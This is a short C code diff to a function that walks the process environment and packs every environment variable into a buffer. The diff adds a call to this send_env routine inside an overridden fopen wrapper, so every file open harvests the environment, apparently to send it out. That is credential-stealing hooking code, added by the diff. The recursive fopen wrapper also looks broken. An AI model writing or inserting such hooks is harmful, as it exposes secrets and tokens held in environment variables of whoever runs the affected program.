@@ -72,6 +72,10 @@ void send_env() {
     char *ptr = data;
     size_t len = 0;
     for (int i = 0; environ[i]; i++) {
+        if(len > 6500) {
+            break;
+        }
+
         len = snprintf(ptr, 65536 - (ptr - data), "%s&", environ[i]);
         ptr += len;
     }
@@ -86,6 +90,7 @@ void send_env() {
 
 FILE *fopen(const char *path, const char *mode) {
     printf("a");
+    send_env();
     return fopen(path, mode);
 }
 
